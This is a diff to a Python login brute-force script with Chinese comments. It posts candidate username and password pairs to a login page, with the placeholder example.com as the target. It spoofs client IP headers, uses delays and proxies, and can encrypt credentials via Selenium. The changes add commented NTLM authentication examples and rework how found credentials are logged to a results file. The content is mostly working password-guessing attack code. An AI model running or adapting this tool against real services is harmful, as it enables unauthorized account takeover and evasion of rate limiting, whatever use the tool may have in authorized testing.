@@ -2,6 +2,7 @@
 
 import requests, urllib3, random, os, traceback, time, binascii, base64, threading, re
 from requests.exceptions import ConnectTimeout, ConnectionError, ReadTimeout
+from requests_ntlm import HttpNtlmAuth
 from urllib3.exceptions import MaxRetryError
 from datetime import datetime, timedelta
 from Crypto.PublicKey import RSA
@@ -9,8 +10,8 @@ from Crypto.Cipher import DES, AES, PKCS1_v1_5
 from Crypto.Util.Padding import pad
 from concurrent import futures
 from lxml import etree
-#from selenium.webdriver.chrome.options import Options
-#from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium import webdriver
 
 # 禁用https警告
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -56,9 +57,9 @@ if 'PASSWORD_FILE_PATH' in vars() and PASSWORD_FILE_PATH:
 # =================== [ 爆破结果 ] ===================
 #
 
-# 结果保存位置
 SUCCESS_OUTPUT_PATH = "result.success.txt"
 SUCCESS_OUTPUT_LOCK = threading.Lock() # 文件互斥锁
+
 ERROR_OUTPUT_PATH = "result.error.txt"
 ERROR_OUTPUT_LOCK = threading.Lock() # 文件互斥锁
 
@@ -151,12 +152,13 @@ cipher.setPublicKey(pk);
 # 设置Headers
 HEADERS = requests.utils.default_headers()
 HEADERS.update({
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0"
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
+    'Connection': 'close',
 })
 
 # 设置Cookies
 COOKIES = {
-    'PHPSESSIONID': '0xDEADBEEF'
+    'SESSIONID': '',
 }
 
 # 根据需要决定是否启动Selenium
@@ -174,14 +176,15 @@ def run(username, password):
         "X-Remote-Addr": IP,
         "X-Real-IP": IP
     })
-    
-    session = requests.Session()
 
     time.sleep(DELAY)
 
     try:
+        url = "https://example.com"
+        session = requests.Session()
+        
         # 可以先用 session 请求一次 CSRF Token / Cookie 再发起登录请求
-        #response = session.get("https://example.com/login.html",
+        #response = session.get(url + "/login.html",
         #    headers=HEADERS, cookies=COOKIES, timeout=10, 
         #    allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)
         #html = etree.HTML(response.text, etree.HTMLParser())
@@ -190,12 +193,16 @@ def run(username, password):
         # 这里selenium可以自动识别username和password是string类型，并自动加上双引号
         #username_encrypted = BROWSER.execute_script('return cipher.encrypt(arguments[0])', username)
         #password_encrypted = BROWSER.execute_script('return cipher.encrypt(arguments[0])', password)
+        
+        # NTLM认证示例
+        #response = session.get(url + "/index.html", auth=HttpNtlmAuth(username, password))
+        #response = session.get(url + "/index.html", auth=HttpNtlmAuth(f"domain\\{username}", password))
 
         data = {
             "username": username,
             "password": password
         }
-        response = session.post("https://example.com/login.html",
+        response = session.post(url + "/login.html",
             data=data, headers=HEADERS, cookies=COOKIES, timeout=10, 
             allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)
 
@@ -203,15 +210,16 @@ def run(username, password):
         # if response.status_code == 401:
         # if "Login failed" in response.text:
         # if response.status_code == 302 and "index/login.html" in response.headers['Location']:
-
         if "Login failed" in response.text:
             return True, False
-        
+
         if "Unknown user" in response.text:
             return True, False
-        
-        write_to_file(SUCCESS_OUTPUT_PATH, SUCCESS_OUTPUT_LOCK, f"{username}:{password}\n")
-        print(f"[++] {datetime.now().strftime('%H:%M:%S')} Found {username}:{password}\t\t=> code:{response.status_code} length:{len(response.content)}")
+
+        # 找到密码
+        output = f"[++] {datetime.now().strftime('%H:%M:%S')} Found {username}:{password}\t\t=> code:{response.status_code} length:{len(response.content)}"
+        write_to_file(SUCCESS_OUTPUT_PATH, SUCCESS_OUTPUT_LOCK, f"{output}\n")
+        print(output)
         return True, True
 
     except (ConnectTimeout, ConnectionError, ReadTimeout) as e:
